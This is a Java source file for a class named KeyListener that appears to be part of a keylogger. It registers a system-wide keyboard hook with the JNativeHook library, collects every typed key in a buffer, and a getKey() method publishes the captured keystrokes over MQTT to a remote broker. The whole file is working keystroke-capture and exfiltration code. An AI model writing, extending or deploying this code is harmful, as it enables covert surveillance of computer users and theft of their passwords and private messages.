package keys;

import handlers.MqttConnectionHandler;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.FileWriter;

public class KeyListener implements NativeKeyListener {
    static StringBuilder stringBuilder = new StringBuilder();
    static FileWriter fileWriter;
    MqttConnectionHandler mqttConnectionHandler = new MqttConnectionHandler();

    public static void startLog() {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err.println(ex.getMessage());
            System.exit(1);
        }
        GlobalScreen.addNativeKeyListener(new KeyListener());
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));

        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException e1) {
                e1.printStackTrace();
            }
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        //stringBuilder.append(NativeKeyEvent.getKeyText(e.getKeyCode()));

    }

    public void nativeKeyTyped(NativeKeyEvent e) {
        System.out.println("Key Typed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        stringBuilder.append(NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    public void getKey() {
        mqttConnectionHandler.publish(stringBuilder.toString());
        stringBuilder.delete(0, stringBuilder.length()); //flushing the builder

    }
}